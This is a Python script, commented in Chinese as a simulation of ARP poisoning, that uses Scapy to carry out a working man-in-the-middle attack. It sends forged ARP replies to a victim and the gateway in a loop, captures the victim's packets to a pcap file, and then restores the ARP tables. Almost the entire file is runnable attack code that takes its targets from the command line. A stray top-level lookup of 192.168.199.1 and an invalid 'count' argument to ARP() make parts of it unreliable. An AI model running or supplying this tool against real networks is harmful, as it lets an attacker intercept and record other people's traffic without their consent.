"""
模拟arp投毒
"""
from multiprocessing import Process
from scapy.all import (conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
from scapy.layers.l2 import ARP, Ether
import os
import sys
import time


# 获取ip对应mac
def get_mac(target_ip):
    # 这个 / 运算符用作两层之间的合成运算符
    # 广播地址
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src

    return None


get_mac("192.168.199.1")


class Arper:
    def __init__(self, victim, gateway, interface="en0"):
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f"Initialized {interface}:")
        print(f"Gateway ({gateway}) is at {self.gateway_mac}")
        print(f"Victim ({victim}) is at {self.victim_mac}")
        print("-" * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    # 投毒
    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac

        print(f"ip src: {poison_victim.psrc}")
        print(f"ip dst: {poison_victim.pdst}")
        print(f"mac dst: {poison_victim.hwdst}")
        print(f"mac src: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print("-" * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gateway_mac
        print(f"ip src: {poison_gateway.psrc}")
        print(f"ip dst: {poison_gateway.pdst}")
        print(f"mac dst: {poison_gateway.hwdst}")
        print(f"mac src: {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print("-" * 30)

        print(f"Beginning the ARP poison.[CTRL-C to stop]'")
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    # 嗅探
    def sniff(self, count=200):
        time.sleep(5)
        print(f"Sniffing {count} packets")
        bpf_filter = "ip host %s" % self.victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap("arper.pcap", packets)
        print("Got the packets")
        self.restore()
        self.poison_thread.terminate()
        print("Finished.")

    # 恢复网络设置
    def restore(self):
        print("Restoring ARP tables...")
        send(
            ARP(
                op=2,
                psrc=self.gateway,
                hwsrc=self.gateway_mac,
                pdst=self.victim,
                hwdst="ff:ff:ff:ff:ff:ff",
                count=5
            )
        )
        send(
            ARP(
                op=2,
                psrc=self.victim,
                hwsrc=self.victim_mac,
                pdst=self.gateway,
                hwdst="ff:ff:ff:ff:ff:ff",
                count=5
            )
        )


if __name__ == '__main__':
    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    my_arp = Arper(victim, gateway, interface)
    my_arp.run()

